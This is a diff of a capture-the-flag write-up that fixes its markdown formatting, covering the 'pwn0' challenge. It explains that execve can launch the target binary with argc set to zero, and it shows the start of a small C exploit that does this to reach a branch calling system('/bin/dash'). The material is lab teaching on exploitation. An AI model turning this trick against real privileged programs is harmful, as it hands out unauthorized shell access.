@@ -30,7 +30,7 @@ if(reg == 78954)
 	printf("You Win\n");
 	system("/bin/dash");
 }
-##############################
+
 Step1 : run a program with argc=0
 What's special about the family exec call system ?
 execve allows you to specify the command-line arguments (including the program name).
@@ -40,9 +40,9 @@ execve("/home/xxx/prog",NULL,NULL) would be a little bit different .... argc is 
 
 with that said, let's start exploiting .....
 First, we write a small program 
-#########################
-#include <stdio.h>
-#include <stdlib.h>
+
+\#include <stdio.h>
+\#include <stdlib.h>
 int main()
 {
 	execve("/challenges/pwn0/0",NULL,NULL);
